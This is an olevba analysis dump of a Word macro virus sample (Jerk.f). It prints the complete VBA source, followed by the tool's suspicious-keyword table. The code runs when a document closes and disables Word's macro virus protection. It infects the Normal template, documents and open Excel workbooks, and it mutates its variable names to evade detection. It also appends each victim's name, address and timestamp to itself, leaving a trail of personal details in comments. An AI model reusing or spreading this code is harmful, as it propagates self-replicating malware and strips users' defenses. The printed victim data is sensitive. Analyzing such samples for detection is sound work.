olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.f-16b885760faa56a815f455c9a734e1b5bb555715
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.f-16b885760faa56a815f455c9a734e1b5bb555715 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


































Private Sub Document_Close()
On Error Resume Next
Const OYPSFPEV = True, KEXIOVYRKXZ = False, ENLXFQYEBDGXIH = 0, QKCJXXBGERE = 1, IGZYLZRK = wdFormatDocument, VIHXTSYBKWQPXY = wdFormatTemplate, ZLBNNY = ":"
Dim JYSKBPQABEKMO, QUBCNCNQKE, ZRREAUCBL, PWAYNJWMSPF As Boolean
Dim HQBQUMQNHLOSB, OCFJIOUA As Object
Dim PCDZEOQCFNUS, TENMTXFWLOHWB As String
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
Set HQBQUMQNHLOSB = ActiveDocument.VBProject.VBComponents.Item(QKCJXXBGERE)
Set OCFJIOUA = NormalTemplate.VBProject.VBComponents.Item(QKCJXXBGERE)
Randomize
ZRREAUCBL = KEXIOVYRKXZ
PWAYNJWMSPF = KEXIOVYRKXZ
If HQBQUMQNHLOSB.CodeModule.CountOfLines <> ENLXFQYEBDGXIH Then ZRREAUCBL = OYPSFPEV
If OCFJIOUA.CodeModule.CountOfLines <> ENLXFQYEBDGXIH Then PWAYNJWMSPF = OYPSFPEV
Options.VirusProtection = KEXIOVYRKXZ
If (ZRREAUCBL = OYPSFPEV Xor PWAYNJWMSPF = OYPSFPEV) And (ActiveDocument.SaveFormat = IGZYLZRK Or ActiveDocument.SaveFormat = VIHXTSYBKWQPXY) Then
If ZRREAUCBL = OYPSFPEV Then
QUBCNCNQKE = NormalTemplate.Saved
TENMTXFWLOHWB = HQBQUMQNHLOSB.CodeModule.Lines(QKCJXXBGERE, HQBQUMQNHLOSB.CodeModule.CountOfLines)
Call RXHBLNCXIYAU(TENMTXFWLOHWB)
If Int(Rnd * 10 * QKCJXXBGERE) = QKCJXXBGERE * 7 Then Call WUGBESF(TENMTXFWLOHWB)
Call LGVRXAM(TENMTXFWLOHWB)
OCFJIOUA.CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If QUBCNCNQKE = OYPSFPEV Then NormalTemplate.Save
End If
PCDZEOQCFNUS = Mid(ActiveDocument.FullName, 2, QKCJXXBGERE)
If PWAYNJWMSPF = OYPSFPEV And (PCDZEOQCFNUS = ZLBNNY Or ActiveDocument.Saved = KEXIOVYRKXZ) Then
JYSKBPQABEKMO = ActiveDocument.Saved
TENMTXFWLOHWB = OCFJIOUA.CodeModule.Lines(QKCJXXBGERE, OCFJIOUA.CodeModule.CountOfLines)
Call LGVRXAM(TENMTXFWLOHWB)
HQBQUMQNHLOSB.CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If JYSKBPQABEKMO = OYPSFPEV Then ActiveDocument.Save
End If
End If
End Sub
Private Sub WUGBESF(ByRef TENMTXFWLOHWB As String)
On Error Resume Next
Const RAZQOBAA = 48, QKZMFYY = 15, YUGZOV = 5, LUOQAHTCTVBUJL = 65, HFCTOT = 90, QKCJXXBGERE = 1, OYPSFPEV = True, KEXIOVYRKXZ = False
Dim XZDOWAKSWXD, XQYGRTmp, VYQIGSLXOZL, XQYGR(QKCJXXBGERE To RAZQOBAA), XQYGR2(QKCJXXBGERE To RAZQOBAA) As String
Dim YWSFYTAZWGTHVBN, PNXJERHBBO, MKSGE As Integer
Dim YZZAJODXNSZYEX As Boolean
XZDOWAKSWXD = "TENMTXFWLOHWB RAZQOBAA XQYGR XQYGR2 VYQIGSLXOZL YWSFYTAZWGTHVBN PNXJERHBBO MKSGE YZZAJODXNSZYEX WUGBESF QKZMFYY YUGZOV LUOQAHTCTVBUJL HFCTOT QKCJXXBGERE XZDOWAKSWXD XQYGRTmp JYSKBPQABEKMO QUBCNCNQKE ZRREAUCBL PWAYNJWMSPF HQBQUMQNHLOSB OCFJIOUA RXHBLNCXIYAU YGOFCUNZCWFJ RJHYJXBSELYZX JHQCGQSROAVOCT GSGLJLEWZFMM YGOFCUNZCWFJTmp OTCSY FBCQLLDG PCDZEOQCFNUS OYPSFPEV KEXIOVYRKXZ ENLXFQYEBDGXIH IGZYLZRK VIHXTSYBKWQPXY NNGNOZHGSKP VIGZM ZLBNNY KZTYYQLI ZZVDDYDSZWZOKZ DWGMWZKPXXPGKDZ SMPYXIUJV LGVRXAM QKWOSNNSETNBOLS FFMKEFJJRVHP NVHMC"
Randomize
PNXJERHBBO = QKCJXXBGERE
For YWSFYTAZWGTHVBN = QKCJXXBGERE To Len(XZDOWAKSWXD)
If Mid(XZDOWAKSWXD, YWSFYTAZWGTHVBN, QKCJXXBGERE) = " " Or YWSFYTAZWGTHVBN = Len(XZDOWAKSWXD) Then
If YWSFYTAZWGTHVBN = Len(XZDOWAKSWXD) Then XQYGRTmp = XQYGRTmp & Mid(XZDOWAKSWXD, YWSFYTAZWGTHVBN, QKCJXXBGERE)
For MKSGE = QKCJXXBGERE To Int((QKZMFYY - YUGZOV + QKCJXXBGERE) * Rnd + YUGZOV)
XQYGR2(PNXJERHBBO) = XQYGR2(PNXJERHBBO) & Chr(Int((HFCTOT - LUOQAHTCTVBUJL + QKCJXXBGERE) * Rnd + LUOQAHTCTVBUJL))
Next MKSGE
XQYGR(PNXJERHBBO) = XQYGRTmp
XQYGRTmp = ""
PNXJERHBBO = PNXJERHBBO + QKCJXXBGERE
Else
XQYGRTmp = XQYGRTmp & Mid(XZDOWAKSWXD, YWSFYTAZWGTHVBN, QKCJXXBGERE)
End If
Next YWSFYTAZWGTHVBN
YZZAJODXNSZYEX = KEXIOVYRKXZ
For YWSFYTAZWGTHVBN = QKCJXXBGERE To Len(TENMTXFWLOHWB)
For PNXJERHBBO = QKCJXXBGERE To RAZQOBAA
If Mid(TENMTXFWLOHWB, YWSFYTAZWGTHVBN, Len(XQYGR(PNXJERHBBO))) = XQYGR(PNXJERHBBO) Then
VYQIGSLXOZL = VYQIGSLXOZL & XQYGR2(PNXJERHBBO)
YWSFYTAZWGTHVBN = YWSFYTAZWGTHVBN + Len(XQYGR(PNXJERHBBO)) - QKCJXXBGERE
YZZAJODXNSZYEX = OYPSFPEV
Exit For
End If
Next PNXJERHBBO
If YZZAJODXNSZYEX = KEXIOVYRKXZ Then
VYQIGSLXOZL = VYQIGSLXOZL & Mid(TENMTXFWLOHWB, YWSFYTAZWGTHVBN, QKCJXXBGERE)
Else
YZZAJODXNSZYEX = KEXIOVYRKXZ
End If
Next YWSFYTAZWGTHVBN
TENMTXFWLOHWB = VYQIGSLXOZL
End Sub
Private Sub RXHBLNCXIYAU(ByRef TENMTXFWLOHWB As String)
On Error Resume Next
Const GSGLJLEWZFMM = "' ", QKCJXXBGERE = 1
Const NNGNOZHGSKP = "hh:mm:ss: AMPM - ", VIGZM = "dddd, d mmm yyyy"
Dim YGOFCUNZCWFJTmp, YGOFCUNZCWFJ, OTCSY, FBCQLLDG, RJHYJXBSELYZX, JHQCGQSROAVOCT As String
Dim YWSFYTAZWGTHVBN As Integer
RJHYJXBSELYZX = Chr(10 * QKCJXXBGERE + 3)
YGOFCUNZCWFJ = Application.UserAddress
FBCQLLDG = Format(Time, NNGNOZHGSKP) & Format(Date, VIGZM)
JHQCGQSROAVOCT = Chr(QKCJXXBGERE * 10)
OTCSY = Application.UserName
For YWSFYTAZWGTHVBN = QKCJXXBGERE To Len(YGOFCUNZCWFJ)
If Mid(YGOFCUNZCWFJ, YWSFYTAZWGTHVBN, QKCJXXBGERE) <> RJHYJXBSELYZX Then
If Mid(YGOFCUNZCWFJ, YWSFYTAZWGTHVBN, QKCJXXBGERE) <> JHQCGQSROAVOCT Then
YGOFCUNZCWFJTmp = YGOFCUNZCWFJTmp & Mid(YGOFCUNZCWFJ, YWSFYTAZWGTHVBN, QKCJXXBGERE)
End If
Else
YGOFCUNZCWFJTmp = YGOFCUNZCWFJTmp & RJHYJXBSELYZX & GSGLJLEWZFMM
End If
Next YWSFYTAZWGTHVBN
TENMTXFWLOHWB = TENMTXFWLOHWB & RJHYJXBSELYZX & GSGLJLEWZFMM & FBCQLLDG & RJHYJXBSELYZX & GSGLJLEWZFMM & OTCSY & RJHYJXBSELYZX & GSGLJLEWZFMM & YGOFCUNZCWFJ & RJHYJXBSELYZX
End Sub
Private Sub LGVRXAM(ByVal TENMTXFWLOHWB As String)
On Error Resume Next
Dim NVHMC As Long
Dim KZTYYQLI As Object
Dim QKWOSNNSETNBOLS, FFMKEFJJRVHP As String
QKWOSNNSETNBOLS = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
NVHMC = &H0
FFMKEFJJRVHP = "Options6"
System.PrivateProfileString("", QKWOSNNSETNBOLS, FFMKEFJJRVHP) = NVHMC
Set KZTYYQLI = GetObject(, "Excel.Application")
Const QKCJXXBGERE = 1, ENLXFQYEBDGXIH = 0
Dim DWGMWZKPXXPGKDZ As String
Dim YWSFYTAZWGTHVBN, PNXJERHBBO As Integer
DWGMWZKPXXPGKDZ = "ThisWorkbook"
For YWSFYTAZWGTHVBN = QKCJXXBGERE To KZTYYQLI.Application.Workbooks.Count
For PNXJERHBBO = QKCJXXBGERE To KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Count
If KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.CountOfLines = ENLXFQYEBDGXIH Then
KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).Name = DWGMWZKPXXPGKDZ Then
KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.ReplaceLine 33 * QKCJXXBGERE, "Private Sub Workbook_Deactivate()"
Else
KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.ReplaceLine QKCJXXBGERE * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next PNXJERHBBO
Next YWSFYTAZWGTHVBN
Set KZTYYQLI = Nothing
End Sub
Private Sub SMPYXIUJV(ByVal TENMTXFWLOHWB As String)
On Error Resume Next
Const OYPSFPEV = True, KEXIOVYRKXZ = False, QKCJXXBGERE = 1, ENLXFQYEBDGXIH = 0
Dim ZZVDDYDSZWZOKZ As Object
Dim QUBCNCNQKE As Boolean
Set ZZVDDYDSZWZOKZ = GetObject(, "Word.Application")
If ZZVDDYDSZWZOKZ.NormalTemplate.VBProject.VBComponents.Item(QKCJXXBGERE).CodeModule.CountOfLines = ENLXFQYEBDGXIH Then
QUBCNCNQKE = ZZVDDYDSZWZOKZ.NormalTemplate.Saved
ZZVDDYDSZWZOKZ.Options.VirusProtection = KEXIOVYRKXZ
ZZVDDYDSZWZOKZ.NormalTemplate.VBProject.VBComponents.Item(QKCJXXBGERE).CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If QUBCNCNQKE = OYPSFPEV Then ZZVDDYDSZWZOKZ.NormalTemplate.Save
End If
Set ZZVDDYDSZWZOKZ = Nothing
End Sub

' 09:50:09: AM - Wednesday, 10 Feb 1999
' Al Peabody
' 1634 Orchard Beach Road
Annapolis, MD 21401

' 09:42:15: AM - Monday, 22 Feb 1999
' Sergey Morozov
'

' 09:49:26: AM - ÷åòâåðã, 11 ìàð 1999
' Advisor
'

' 04:16:54:  - ïîíåäåëüíèê, 22 ìàð 1999
' ***
'

' 11:52:11:  - ÷åòâåðã, 15 àïð 1999
' Freddy Kruger
'

' 11:45:13:  - âòîðíèê, 27 ìàé 1997
' MAXuS
'

' 09:59:34:  - ñóááîòà, 3 èþí 1995
' 7
'

' 08:02:29:  - ñóááîòà, 7 ôåâ 1998
' Alex
'

' 11:07:41:  - âîñêðåñåíüå, 8 ôåâ 1998
' Alex
'

' 01:34:29:  - ïîíåäåëüíèê, 9 ôåâ 1998
' Alex
'

' 07:03:00:  - ñðåäà, 4 ôåâ 1998
' Alex
'

' 02:46:36:  - ñóááîòà, 4 ìàð 2000
' user
'

' 11:17:37:  - ïÿòíèöà, 4 ÿíâ 1980
' Ñâåòà
'

' 03:14:19:  - ñðåäà, 21 èþí 2000
' User
'

' 12:41:56:  - âîñêðåñåíüå, 9 èþë 2000
' Ëåíà
'

' 10:39:32:  - ñóááîòà, 2 ñåí 2000
' Ëåíà
'

' 11.57.54.  - martedì, 10 ott 2000
' Èíà
'

' 02:57:29:  - ÷åòâåðã, 19 îêò 2000
' Ina
'

' 04:14:51:  - piektdiena, 12 Jan 2001
' Sandra Kraze
'

' 08:13:34: PM - Thursday, 25 Jan 2001
' Tester
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

